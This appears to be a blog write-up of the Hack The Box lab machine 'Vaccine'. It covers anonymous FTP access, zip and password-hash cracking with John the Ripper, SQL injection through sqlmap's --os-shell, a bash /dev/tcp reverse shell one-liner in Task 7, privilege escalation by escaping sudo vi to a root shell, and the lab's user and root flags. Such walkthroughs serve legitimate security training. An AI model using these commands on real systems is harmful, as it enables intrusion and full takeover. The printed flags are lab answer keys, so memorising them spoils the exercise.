# 5. Vaccine (Tier 2)

<img src="/static/htb/vaccine/vaccine.png" style="border-radius: 10px; width: 40%;"/>

We are moving to the Tier 2 machines from the very easy ones.

---

## Booting up and doing the tasks

We have started the machine and checked if it is accessible.

<img src="/static/htb/vaccine/vaccine3.png" style="border-radius: 10px; width: 50%;"/> <img src="/static/htb/vaccine/vaccine2.png" style="border-radius: 10px; width: 50%;"/>

Now we are going to do the tasks.

!!!success Task 1
Besides SSH and HTTP, what other service is hosted on this box? 
> **FTP** (we found it with a default nmap scan)
<br><br>
<img src="/static/htb/vaccine/vaccine4.png" style="border-radius: 10px; width: 50%;"/>
!!!

!!!success Task 2
This service can be configured to allow login with any password for specific username. What is that username?  
> **anonymous** (I have learned that we always need to give "anonymous" a try)
<img src="/static/htb/vaccine/vaccine5.png" style="border-radius: 10px; width: 50%;"/>
!!!

!!!success Task 3
What is the name of the file downloaded over this service?  
> **backup.zip** (as seen on the previous screenshot, backup.zip can be downloaded from the FTP)
<img src="/static/htb/vaccine/vaccine6.png" style="border-radius: 10px; width: 50%;"/>
!!!

!!!success Task 4
What script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts? 
> **zip2john** (a very nice tool that generates a hash from a pw protected archive)
<br><br>
We have taken the hash with the tool.
<img src="/static/htb/vaccine/vaccine7.png" style="border-radius: 10px; width: 80%;"/>
<br><br>
We have ran john to find the password of the zip:
<img src="/static/htb/vaccine/vaccine10.png" style="border-radius: 10px; width: 80%;"/>
!!!

!!!success Task 5
What is the password for the admin user on the website?  
> **qwerty789** 

First we found the password hash from one of the files in the zip after we have cracked the zip pass in the previous step.
<img src="/static/htb/vaccine/vaccine8.png" style="border-radius: 10px; width: 80%;"/>
<br><br>
Then we ran john + rockyou wordlist against that hash that we have stored in hash.txt
<img src="/static/htb/vaccine/vaccine9.png" style="border-radius: 10px; width: 80%;"/>

We have managed to log in with **admin/qwerty789** on the available webpage
<img src="/static/htb/vaccine/vaccine11.png" style="border-radius: 10px; width: 80%;"/>
!!!

!!!success Task 6
What option can be passed to sqlmap to try to get command execution via the sql injection? 
> **--os-shell** (This will instruct sqlmap to try spawning an interactive os shell if the SQL injection is exploitable)

(You can see that the IP is different but that is due to the fact I am continuing this at another day so the spawned VM has changed its address.)


<br><br>
So first thing to do is to start our burp and capture the request.
<img src="/static/htb/vaccine/vaccine12.png" style="border-radius: 10px; width: 80%;"/>
<img src="/static/htb/vaccine/vaccine13.png" style="border-radius: 10px; width: 80%;"/>

What I'll do now is save this request to a file called "sqli.req". The thing I'll do with the file is that I will run a sqlmap on it so it will basically test all fields automatically. I've learned that sometimes it is way better to do that since there could be more complex scenarios where it will be a bit challenging to specify in the url if we used one instead.

We will run our command the following way, using --batch so we can put sqlmap into non-interactive mode which means it will use default options for prompts.
<img src="/static/htb/vaccine/vaccine14.png" style="border-radius: 10px; width: 80%;"/>

Seems that the target is vulnerable and we got an os-shell.
<img src="/static/htb/vaccine/vaccine15.png" style="border-radius: 10px; width: 80%;"/>
!!!

!!!success Task 7
What program can the postgres user run as root using sudo? 
> **vi** (check how we found it with the steps below, took me a while) 

The os-shell is kind of broken and doesn't work well so we will try to open a reverse shell. I'll set up a listener on my machine:
<img src="/static/htb/vaccine/vaccine16.png" style="border-radius: 10px; width: 80%;"/>

And then I'll run : ***bash -c "bash -i >& /dev/tcp/10.10.14.245/1337 0>&1"*** (basically it should open an interractive shell towards my host)

<img src="/static/htb/vaccine/vaccine17.png" style="border-radius: 10px; width: 80%;"/>
<br><br>

Now we got the shell :
<br><br>
<img src="/static/htb/vaccine/vaccine18.png" style="border-radius: 10px; width: 80%;"/>

I found some flag but I think this is the answer for the next step.
<img src="/static/htb/vaccine/vaccine19.png" style="border-radius: 10px; width: 80%;"/>

So we had to find some password so we can "sudo -l". Took me probably like 30 minutes to cat around files but found this in the end: 

<img src="/static/htb/vaccine/vaccine20.png" style="border-radius: 10px; width: 80%;"/>
<br><br>
Seems to be a php file located in /var/www/html that has credentials in it. 
<img src="/static/htb/vaccine/vaccine21.png" style="border-radius: 10px; width: 80%;"/>
<br><br>
Using this pass as sudo seems to work and upon running "sudo -l" we can see that we can edit some conf file with vi as a sudo user.
<img src="/static/htb/vaccine/vaccine22.png" style="border-radius: 10px; width: 80%;"/>


My shell constantly breaks at this point and doesn't work well. I can't even properly see the contents of the file that we can edit as sudo. There are privilege escalation exploits via vi so we would want to try that. However first I need to have a stable connection. If we go back to the nmap scan we can see that we have ssh opened, so that's right, I will try to ssh for more stable connection.
<img src="/static/htb/vaccine/vaccine23.png" style="border-radius: 10px; width: 80%;"/>

After a lot of struggle we are finally in and we can try our command as sudo😵
<img src="/static/htb/vaccine/vaccine24.png" style="border-radius: 10px; width: 80%;"/>

Okay seems to be working now. So we got to find an exploit for that.
<img src="/static/htb/vaccine/vaccine25.png" style="border-radius: 10px; width: 80%;"/>

This is a great example I found: https://medium.com/@pettyhacks/linux-privilege-escalation-via-vi-36c00fcd4f5e . As per this post it seems that we can spawn ourselves a shell through vi as it is already running as root. (:!/bin/bash)

<img src="/static/htb/vaccine/vaccine26.png" style="border-radius: 10px; width: 70%;"/>
<br><br>
There we go, we are having a shell as a root now.
<img src="/static/htb/vaccine/vaccine27.png" style="border-radius: 10px; width: 70%;"/>

Now the last task is to find the root flag. So far as per my observations  the flags are mostly hidden in .txt files. What I am going to do to save myself some manual navigation as I did when finding the user flag, I will just type the following : 
**find / -type f -name "*.txt"**. That way I will just see all the .txt files under the / directory.

Well it took me only a few minutes of manual scrolling to find that 😂. Way better than the last time I guess.

<img src="/static/htb/vaccine/vaccine28.png" style="border-radius: 10px; width: 70%;"/>
<br><br>
There we go!
<br></br>
<img src="/static/htb/vaccine/vaccine29.png" style="border-radius: 10px; width: 50%;"/>
<br></br>
!!!

!!!success SUBMIT FLAG
Submit user flag 
> **ec9b13ca4d6229cd5cc1e09980965bf7** (found at the start of Task 7)
!!!

!!!success SUBMIT FLAG
Submit root flag 
> **dd6e058e814260bc70e9bbdef2715849** (found at the end of task 7)
!!!

---

## Summary

Well what can I say. It took me a while, had to work on this machine for 2 days to complete it. In my opinion this isn't a "Very Easy" machine. Was quite interesting but I don't think it's even comparable to Fawn for example 😂. Took some research but I can say that I have learned a lot of new things. While it might be "Very Easy" for a professional, I can definitely say that it was a bit of a challenge.

<img src="/static/htb/vaccine/vaccine30.png" style="border-radius: 10px; width: 50%;"/>